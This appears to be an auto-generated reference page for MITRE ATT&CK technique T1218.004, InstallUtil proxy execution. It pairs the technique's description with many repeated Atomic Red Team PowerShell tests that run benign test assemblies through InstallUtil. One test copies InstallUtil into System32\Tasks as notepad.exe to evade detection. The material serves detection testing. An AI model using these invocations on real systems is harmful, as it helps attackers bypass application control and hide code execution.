
# InstallUtil

## Description

### MITRE Description

> Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) InstallUtil is digitally signed by Microsoft and located in the .NET directories on a Windows system: <code>C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe</code> and <code>C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe</code>.

InstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]</code>. (Citation: LOLBAS Installutil)

## Aliases

```

```

## Additional Attributes

* Bypass: ['Digital Certificate Validation', 'Application control']
* Effective Permissions: None
* Network: None
* Permissions: ['User']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1218/004

## Potential Commands

```
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. #{test_harness}

$InstallerAssemblyDir = "#{assembly_dir}"
$InstallerAssemblyFileName = "#{assembly_filename}"
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = "/logfile= /logtoconsole=false /installtype=notransaction /action=install `"$InstallerAssemblyFullPath`""
$ExpectedOutput = 'Constructor_Install_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = 'Executable'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs

if ($ActualOutput -ne $ExpectedOutput) {
    throw @"
InstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
"@
}
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. #{test_harness}

$InstallerAssemblyDir = "$Env:TEMP\"
$InstallerAssemblyFileName = "#{assembly_filename}"
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = "/logfile= /logtoconsole=false `"$InstallerAssemblyFullPath`""
$ExpectedOutput = 'Constructor_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly

if ($ActualOutput -ne $ExpectedOutput) {
    throw @"
InstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
"@
}
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. #{test_harness}

$InstallerAssemblyDir = "#{assembly_dir}"
$InstallerAssemblyFileName = "T1218.004.dll"
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = "/? `"$InstallerAssemblyFullPath`""
$ExpectedOutput = 'Constructor_HelpText_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs

if ($ActualOutput -ne $ExpectedOutput) {
    throw @"
InstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
"@
}
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1

$InstallerAssemblyDir = "#{assembly_dir}"
$InstallerAssemblyFileName = "#{assembly_filename}"
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = "/logfile= /logtoconsole=false `"$InstallerAssemblyFullPath`""
$ExpectedOutput = 'Constructor_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly

if ($ActualOutput -ne $ExpectedOutput) {
    throw @"
InstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
"@
}
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1

$InstallerAssemblyDir = "$Env:windir\System32\Tasks"
$InstallerAssemblyFileName = 'readme.txt'
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = "readme.txt"
$ExpectedOutput = 'Constructor_'

# Explicitly set the directory so that a relative path to readme.txt can be supplied.
Set-Location "$Env:windir\System32\Tasks"

Copy-Item -Path "$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe" -Destination "$Env:windir\System32\Tasks\notepad.exe"

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = 'Executable'
    CommandLine = $CommandLine
    InstallUtilPath = "$Env:windir\System32\Tasks\notepad.exe"
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly

if ($ActualOutput -ne $ExpectedOutput) {
    throw @"
Evasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
"@
}
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. #{test_harness}

$InstallerAssemblyDir = "#{assembly_dir}"
$InstallerAssemblyFileName = "T1218.004.dll"
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$ExpectedOutput = 'Constructor_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly

if ($ActualOutput -ne $ExpectedOutput) {
    throw @"
CheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
"@
}
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. #{test_harness}

$InstallerAssemblyDir = "#{assembly_dir}"
$InstallerAssemblyFileName = "#{assembly_filename}"
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = "/logfile= /logtoconsole=false `"$InstallerAssemblyFullPath`""
$ExpectedOutput = 'Constructor_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = 'InstallHelper'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly

if ($ActualOutput -ne $ExpectedOutput) {
    throw @"
InstallHelper method execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
"@
}
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. #{test_harness}

$InstallerAssemblyDir = "$Env:TEMP\"
$InstallerAssemblyFileName = "#{assembly_filename}"
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = "/logfile= /logtoconsole=false /U `"$InstallerAssemblyFullPath`""
$ExpectedOutput = 'Constructor_Uninstall_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs

if ($ActualOutput -ne $ExpectedOutput) {
    throw @"
InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
"@
}
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1

$InstallerAssemblyDir = "#{assembly_dir}"
$InstallerAssemblyFileName = "#{assembly_filename}"
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = "/logfile= /logtoconsole=false `"$InstallerAssemblyFullPath`""
$ExpectedOutput = 'Constructor_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly

if ($ActualOutput -ne $ExpectedOutput) {
    throw @"
InstallHelper method execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
"@
}
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. #{test_harness}

$InstallerAssemblyDir = "#{assembly_dir}"
$InstallerAssemblyFileName = "#{assembly_filename}"
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = "/logfile= /logtoconsole=false /U `"$InstallerAssemblyFullPath`""
$ExpectedOutput = 'Constructor_Uninstall_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = 'Executable'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs

if ($ActualOutput -ne $ExpectedOutput) {
    throw @"
InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
"@
}
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. #{test_harness}

$InstallerAssemblyDir = "$Env:TEMP\"
$InstallerAssemblyFileName = "#{assembly_filename}"
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = "/? `"$InstallerAssemblyFullPath`""
$ExpectedOutput = 'Constructor_HelpText_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs

if ($ActualOutput -ne $ExpectedOutput) {
    throw @"
InstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
"@
}
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. #{test_harness}

$InstallerAssemblyDir = "#{assembly_dir}"
$InstallerAssemblyFileName = "T1218.004.dll"
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = "/logfile= /logtoconsole=false `"$InstallerAssemblyFullPath`""
$ExpectedOutput = 'Constructor_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly

if ($ActualOutput -ne $ExpectedOutput) {
    throw @"
InstallHelper method execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
"@
}
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. #{test_harness}

$InstallerAssemblyDir = "#{assembly_dir}"
$InstallerAssemblyFileName = "T1218.004.dll"
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = "/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `"$InstallerAssemblyFullPath`""
$ExpectedOutput = 'Constructor_Uninstall_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs

if ($ActualOutput -ne $ExpectedOutput) {
    throw @"
InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
"@
}
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. #{test_harness}

$InstallerAssemblyDir = "#{assembly_dir}"
$InstallerAssemblyFileName = "T1218.004.dll"
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = "/logfile= /logtoconsole=false `"$InstallerAssemblyFullPath`""
$ExpectedOutput = 'Constructor_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly

if ($ActualOutput -ne $ExpectedOutput) {
    throw @"
InstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
"@
}
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. #{test_harness}

$InstallerAssemblyDir = "$Env:TEMP\"
$InstallerAssemblyFileName = "#{assembly_filename}"
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = "/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `"$InstallerAssemblyFullPath`""
$ExpectedOutput = 'Constructor_Uninstall_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs

if ($ActualOutput -ne $ExpectedOutput) {
    throw @"
InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
"@
}
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1

$InstallerAssemblyDir = "#{assembly_dir}"
$InstallerAssemblyFileName = "#{assembly_filename}"
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = "/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `"$InstallerAssemblyFullPath`""
$ExpectedOutput = 'Constructor_Uninstall_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs

if ($ActualOutput -ne $ExpectedOutput) {
    throw @"
InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
"@
}
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1

$InstallerAssemblyDir = "#{assembly_dir}"
$InstallerAssemblyFileName = "#{assembly_filename}"
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = "/logfile= /logtoconsole=false /U `"$InstallerAssemblyFullPath`""
$ExpectedOutput = 'Constructor_Uninstall_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs

if ($ActualOutput -ne $ExpectedOutput) {
    throw @"
InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
"@
}
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. #{test_harness}

$InstallerAssemblyDir = "$Env:TEMP\"
$InstallerAssemblyFileName = "#{assembly_filename}"
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$ExpectedOutput = 'Constructor_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly

if ($ActualOutput -ne $ExpectedOutput) {
    throw @"
CheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
"@
}
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. #{test_harness}

$InstallerAssemblyDir = "#{assembly_dir}"
$InstallerAssemblyFileName = "#{assembly_filename}"
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = "/? `"$InstallerAssemblyFullPath`""
$ExpectedOutput = 'Constructor_HelpText_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = 'Executable'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs

if ($ActualOutput -ne $ExpectedOutput) {
    throw @"
InstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
"@
}
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. #{test_harness}

$InstallerAssemblyDir = "#{assembly_dir}"
$InstallerAssemblyFileName = "T1218.004.dll"
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = "/logfile= /logtoconsole=false /U `"$InstallerAssemblyFullPath`""
$ExpectedOutput = 'Constructor_Uninstall_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs

if ($ActualOutput -ne $ExpectedOutput) {
    throw @"
InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
"@
}
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. #{test_harness}

$InstallerAssemblyDir = "#{assembly_dir}"
$InstallerAssemblyFileName = "T1218.004.dll"
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = "/logfile= /logtoconsole=false /installtype=notransaction /action=install `"$InstallerAssemblyFullPath`""
$ExpectedOutput = 'Constructor_Install_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs

if ($ActualOutput -ne $ExpectedOutput) {
    throw @"
InstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
"@
}
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. #{test_harness}

$InstallerAssemblyDir = "$Env:TEMP\"
$InstallerAssemblyFileName = "#{assembly_filename}"
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = "/logfile= /logtoconsole=false `"$InstallerAssemblyFullPath`""
$ExpectedOutput = 'Constructor_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly

if ($ActualOutput -ne $ExpectedOutput) {
    throw @"
InstallHelper method execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
"@
}
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. #{test_harness}

$InstallerAssemblyDir = "#{assembly_dir}"
$InstallerAssemblyFileName = "#{assembly_filename}"
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = "/logfile= /logtoconsole=false `"$InstallerAssemblyFullPath`""
$ExpectedOutput = 'Constructor_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = 'Executable'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly

if ($ActualOutput -ne $ExpectedOutput) {
    throw @"
InstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
"@
}
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1

$InstallerAssemblyDir = "#{assembly_dir}"
$InstallerAssemblyFileName = "#{assembly_filename}"
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = "/logfile= /logtoconsole=false /installtype=notransaction /action=install `"$InstallerAssemblyFullPath`""
$ExpectedOutput = 'Constructor_Install_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs

if ($ActualOutput -ne $ExpectedOutput) {
    throw @"
InstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
"@
}
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1

$InstallerAssemblyDir = "#{assembly_dir}"
$InstallerAssemblyFileName = "#{assembly_filename}"
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$ExpectedOutput = 'Constructor_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly

if ($ActualOutput -ne $ExpectedOutput) {
    throw @"
CheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
"@
}
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. #{test_harness}

$InstallerAssemblyDir = "#{assembly_dir}"
$InstallerAssemblyFileName = "#{assembly_filename}"
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = "/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `"$InstallerAssemblyFullPath`""
$ExpectedOutput = 'Constructor_Uninstall_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = 'Executable'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs

if ($ActualOutput -ne $ExpectedOutput) {
    throw @"
InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
"@
}
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. #{test_harness}

$InstallerAssemblyDir = "$Env:TEMP\"
$InstallerAssemblyFileName = "#{assembly_filename}"
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = "/logfile= /logtoconsole=false /installtype=notransaction /action=install `"$InstallerAssemblyFullPath`""
$ExpectedOutput = 'Constructor_Install_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs

if ($ActualOutput -ne $ExpectedOutput) {
    throw @"
InstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
"@
}
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1

$InstallerAssemblyDir = "#{assembly_dir}"
$InstallerAssemblyFileName = "#{assembly_filename}"
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = "/? `"$InstallerAssemblyFullPath`""
$ExpectedOutput = 'Constructor_HelpText_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs

if ($ActualOutput -ne $ExpectedOutput) {
    throw @"
InstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
"@
}
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. #{test_harness}

$InstallerAssemblyDir = "#{assembly_dir}"
$InstallerAssemblyFileName = "#{assembly_filename}"
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$ExpectedOutput = 'Constructor_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = 'CheckIfInstallable'
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly

if ($ActualOutput -ne $ExpectedOutput) {
    throw @"
CheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
"@
}
```

## Commands Dataset

```
[{'command': '# Import the required test harness function, '
             'Invoke-BuildAndInvokeInstallUtilAssembly\n'
             '. '
             'PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1\n'
             '\n'
             '$InstallerAssemblyDir = "#{assembly_dir}"\n'
             '$InstallerAssemblyFileName = "#{assembly_filename}"\n'
             '$InstallerAssemblyFullPath = Join-Path -Path '
             '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n'
             '\n'
             "$ExpectedOutput = 'Constructor_'\n"
             '\n'
             '$TestArgs = @{\n'
             '    OutputAssemblyDirectory = $InstallerAssemblyDir\n'
             '    OutputAssemblyFileName = $InstallerAssemblyFileName\n'
             "    InvocationMethod = '#{invocation_method}'\n"
             '}\n'
             '\n'
             '$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly '
             '@TestArgs -MinimumViableAssembly\n'
             '\n'
             'if ($ActualOutput -ne $ExpectedOutput) {\n'
             '    throw @"\n'
             'CheckIfInstallable method execution test failure. Installer '
             'assembly execution output did not match the expected output.\n'
             'Expected: $ExpectedOutput\n'
             'Actual: $ActualOutput\n'
             '"@\n'
             '}\n',
  'name': None,
  'source': 'atomics/T1218.004/T1218.004.yaml'},
 {'command': '# Import the required test harness function, '
             'Invoke-BuildAndInvokeInstallUtilAssembly\n'
             '. #{test_harness}\n'
             '\n'
             '$InstallerAssemblyDir = "$Env:TEMP\\"\n'
             '$InstallerAssemblyFileName = "#{assembly_filename}"\n'
             '$InstallerAssemblyFullPath = Join-Path -Path '
             '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n'
             '\n'
             "$ExpectedOutput = 'Constructor_'\n"
             '\n'
             '$TestArgs = @{\n'
             '    OutputAssemblyDirectory = $InstallerAssemblyDir\n'
             '    OutputAssemblyFileName = $InstallerAssemblyFileName\n'
             "    InvocationMethod = '#{invocation_method}'\n"
             '}\n'
             '\n'
             '$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly '
             '@TestArgs -MinimumViableAssembly\n'
             '\n'
             'if ($ActualOutput -ne $ExpectedOutput) {\n'
             '    throw @"\n'
             'CheckIfInstallable method execution test failure. Installer '
             'assembly execution output did not match the expected output.\n'
             'Expected: $ExpectedOutput\n'
             'Actual: $ActualOutput\n'
             '"@\n'
             '}\n',
  'name': None,
  'source': 'atomics/T1218.004/T1218.004.yaml'},
 {'command': '# Import the required test harness function, '
